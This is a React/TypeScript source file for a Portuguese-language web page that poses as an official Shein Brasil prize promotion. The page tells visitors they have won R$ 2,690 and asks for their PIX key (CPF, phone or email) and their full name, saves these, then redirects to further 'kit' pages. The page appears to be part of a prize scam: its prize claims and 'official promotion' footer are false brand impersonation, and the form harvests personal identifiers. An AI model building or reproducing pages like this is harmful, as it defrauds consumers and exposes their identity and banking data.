import { useState, useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation, useNavigate } from "react-router-dom";
import sheinLogo from "@/assets/shein-logo-custom.png";

const pixKeySchema = z.object({
  tipoChave: z.enum(["cpf", "telefone", "email", "aleatoria"], {
    required_error: "Selecione o tipo de chave PIX",
  }),
  chavePixValue: z.string().min(1, "Digite sua chave PIX"),
  titular: z.string().min(3, "Digite o nome completo do titular"),
});

type PixKeyForm = z.infer<typeof pixKeySchema>;

const DadosPix = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const kitType = location.state?.kitType || 'looks';
  const premio = 2690;
  const [tipoChaveSelecionada, setTipoChaveSelecionada] = useState<string>("");
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => {
    if (showLoading) {
      const timer = setTimeout(() => {
        if (kitType === 'looks') {
          navigate('/tamanho-kit', { state: { kitType } });
        } else if (kitType === 'maquiagens') {
          navigate('/categorias-kit', { state: { kitType } });
        }
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [showLoading, kitType, navigate]);

  const {
    register,
    handleSubmit,
    setValue,
    watch,
    formState: { errors },
  } = useForm<PixKeyForm>({
    resolver: zodResolver(pixKeySchema),
  });

  const chavePixValue = watch("chavePixValue", "");

  const validateAndFormatChave = (tipo: string, value: string): boolean => {
    switch (tipo) {
      case "cpf":
        const cpfNumbers = value.replace(/\D/g, "");
        return cpfNumbers.length === 11;
      case "telefone":
        const phoneNumbers = value.replace(/\D/g, "");
        return phoneNumbers.length >= 10 && phoneNumbers.length <= 11;
      case "email":
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(value);
      case "aleatoria":
        return value.length > 0;
      default:
        return false;
    }
  };

  const formatInput = (tipo: string, value: string): string => {
    switch (tipo) {
      case "cpf":
        const cpf = value.replace(/\D/g, "").slice(0, 11);
        return cpf
          .replace(/(\d{3})(\d)/, "$1.$2")
          .replace(/(\d{3})(\d)/, "$1.$2")
          .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
      case "telefone":
        const phone = value.replace(/\D/g, "").slice(0, 11);
        if (phone.length <= 10) {
          return phone.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
        }
        return phone.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3");
      default:
        return value;
    }
  };

  const handleChavePixChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatInput(tipoChaveSelecionada, e.target.value);
    setValue("chavePixValue", formatted);
  };

  const onSubmit = (data: PixKeyForm) => {
    if (!validateAndFormatChave(data.tipoChave, data.chavePixValue)) {
      return;
    }
    // Salva os dados do PIX no localStorage
    localStorage.setItem("dadosPix", JSON.stringify({
      titular: data.titular,
      chavePixValue: data.chavePixValue,
      tipoChave: data.tipoChave,
    }));
    setShowLoading(true);
  };

  const getPlaceholder = (tipo: string): string => {
    switch (tipo) {
      case "cpf":
        return "000.000.000-00";
      case "telefone":
        return "(00) 00000-0000";
      case "email":
        return "seuemail@exemplo.com";
      case "aleatoria":
        return "Digite sua chave aleatória";
      default:
        return "Digite sua chave PIX aqui";
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <div className="flex-1 p-3 sm:p-4 pt-4 sm:pt-8">
        <form onSubmit={handleSubmit(onSubmit)} className="max-w-4xl mx-auto space-y-4 sm:space-y-6">
          <div className="flex justify-between items-start gap-2">
            <img 
              src={sheinLogo} 
              alt="Shein Premiações" 
              className="h-8 sm:h-10 w-auto object-contain"
            />
            <div className="text-right">
              <p className="text-[10px] sm:text-xs text-gray-600">Acumulado em prêmios:</p>
              <p className="text-base sm:text-xl font-bold">
                R$ {premio.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </p>
            </div>
          </div>

          <div className="flex items-center justify-center min-h-[300px] sm:min-h-[500px]">
            <Card className="w-full max-w-xl p-4 sm:p-8 shadow-lg border-2 border-gray-300 rounded-xl sm:rounded-2xl">
              <div className="space-y-4 sm:space-y-6" onClick={(e) => e.stopPropagation()}>
                <div className="text-center space-y-2">
                  <h1 className="text-xl sm:text-2xl font-bold">🎉 PARABÉNS! 🎉</h1>
                  <div className="bg-[#d4edda] border border-[#c3e6cb] rounded-lg p-3 sm:p-4">
                    <p className="text-sm sm:text-base font-semibold text-[#155724]">
                      Você foi recompensada com R$ 2.690,00!
                    </p>
                    <p className="text-xs sm:text-sm text-gray-700 mt-2">
                      Você já selecionou seu <span className="font-bold">Kit de Looks Shein</span> no valor de até{" "}
                      <span className="font-bold text-[#dc2626]">R$ 2.000,00</span>
                    </p>
                  </div>
                </div>

                <div className="bg-[#fff3cd] border border-[#ffa500] rounded-lg p-3 sm:p-4 space-y-2">
                  <h3 className="text-sm sm:text-base font-bold text-[#dc2626] text-center">
                    Você receberá R$ 690,00 via PIX
                  </h3>
                  <p className="text-xs sm:text-sm text-gray-800">
                    Você ganhou R$ 2.690,00 em prêmios e já escolheu seu kit de R$ 2.000,00. Os R$ 690,00 restantes serão enviados para sua chave PIX. Selecione o tipo de chave e insira corretamente para evitar demoras.
                  </p>
                </div>

                <div className="space-y-3 sm:space-y-4">
                  <div className="space-y-1.5 sm:space-y-2">
                    <label className="text-xs sm:text-sm font-medium text-[#2563eb]">
                      Tipo de Chave PIX:
                    </label>
                    <Select
                      onValueChange={(value) => {
                        setTipoChaveSelecionada(value);
                        setValue("tipoChave", value as any);
                        setValue("chavePixValue", "");
                      }}
                    >
                      <SelectTrigger className="w-full bg-white border-gray-300 text-sm">
                        <SelectValue placeholder="Selecione o tipo de chave" />
                      </SelectTrigger>
                      <SelectContent className="bg-white z-50">
                        <SelectItem value="cpf">CPF</SelectItem>
                        <SelectItem value="telefone">Telefone</SelectItem>
                        <SelectItem value="email">E-mail</SelectItem>
                        <SelectItem value="aleatoria">Chave Aleatória</SelectItem>
                      </SelectContent>
                    </Select>
                    {errors.tipoChave && (
                      <p className="text-xs sm:text-sm text-red-600">{errors.tipoChave.message}</p>
                    )}
                  </div>

                  <div className="space-y-1.5 sm:space-y-2">
                    <label className="text-xs sm:text-sm font-medium text-[#2563eb]">
                      Sua Chave PIX:
                    </label>
                    <Input
                      type={tipoChaveSelecionada === "email" ? "email" : "text"}
                      placeholder={getPlaceholder(tipoChaveSelecionada)}
                      className="w-full bg-white border-gray-300 text-sm"
                      disabled={!tipoChaveSelecionada}
                      value={chavePixValue}
                      {...register("chavePixValue")}
                      onChange={handleChavePixChange}
                    />
                    {errors.chavePixValue && (
                      <p className="text-xs sm:text-sm text-red-600">{errors.chavePixValue.message}</p>
                    )}
                    {tipoChaveSelecionada && chavePixValue && !validateAndFormatChave(tipoChaveSelecionada, chavePixValue) && (
                      <p className="text-xs sm:text-sm text-red-600">
                        {tipoChaveSelecionada === "cpf" && "CPF deve ter 11 dígitos"}
                        {tipoChaveSelecionada === "telefone" && "Telefone deve ter 10 ou 11 dígitos"}
                        {tipoChaveSelecionada === "email" && "E-mail inválido"}
                      </p>
                    )}
                  </div>

                  <div className="space-y-1.5 sm:space-y-2">
                    <label className="text-xs sm:text-sm font-medium text-[#dc2626]">
                      Titular da conta (nome completo):
                    </label>
                    <Input
                      type="text"
                      placeholder="Digite o nome completo do titular"
                      className="w-full bg-white border-gray-300 text-sm"
                      {...register("titular")}
                    />
                    {errors.titular && (
                      <p className="text-xs sm:text-sm text-red-600">{errors.titular.message}</p>
                    )}
                  </div>

                  <Button 
                    type="submit"
                    className="w-full bg-black hover:bg-gray-800 text-white py-2.5 sm:py-3 rounded-md text-xs sm:text-sm font-bold mt-4 sm:mt-6"
                  >
                    Confirmar Dados PIX
                  </Button>
                </div>
              </div>
            </Card>
          </div>
        </form>
      </div>

      <Dialog open={showLoading}>
        <DialogContent className="sm:max-w-md bg-white p-6 sm:p-8 mx-4">
          <div className="space-y-4 sm:space-y-6 text-center">
            <div className="space-y-3 sm:space-y-4">
              <h2 className="text-xl sm:text-2xl font-bold">🎉 PARABÉNS! 🎉</h2>
              <div className="bg-[#d4edda] border border-[#c3e6cb] rounded-lg p-3 sm:p-4">
                <p className="text-sm sm:text-base font-semibold text-[#155724]">
                  Você foi recompensada com R$ 2.690,00!
                </p>
                <p className="text-xs sm:text-sm text-gray-700 mt-2">
                  Você já selecionou seu <span className="font-bold">Kit de Looks Shein</span> no valor de até{" "}
                  <span className="font-bold text-[#dc2626]">R$ 2.000,00</span>
                </p>
              </div>

              <div className="bg-[#fff3cd] border border-[#ffa500] rounded-lg p-3 sm:p-4">
                <h3 className="text-sm sm:text-base font-bold text-[#dc2626] mb-2">
                  Você receberá R$ 690,00 via PIX
                </h3>
                <p className="text-xs sm:text-sm text-gray-800">
                  Você ganhou R$ 2.690,00 em prêmios e já escolheu seu kit de R$ 2.000,00. Os R$ 690,00 restantes serão enviados para sua chave PIX.
                </p>
              </div>

              <div className="bg-white border-2 border-gray-300 rounded-lg p-4 sm:p-6 space-y-3">
                <div className="flex justify-center">
                  <div className="animate-spin rounded-full h-10 w-10 sm:h-12 sm:w-12 border-b-2 border-gray-900"></div>
                </div>
                <p className="text-xs sm:text-sm text-gray-700 font-medium">
                  Chave PIX cadastrada com sucesso, aguarde...
                </p>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <footer className="bg-[#374151] text-white py-3 sm:py-4 mt-auto">
        <div className="max-w-4xl mx-auto px-3 sm:px-4 text-center text-[10px] sm:text-xs space-y-1">
          <p>© 2025 Shein. Todas as marcas foram usadas.</p>
          <p>Este é uma promoção oficial da Shein Brasil.</p>
        </div>
      </footer>
    </div>
  );
};

export default DadosPix;
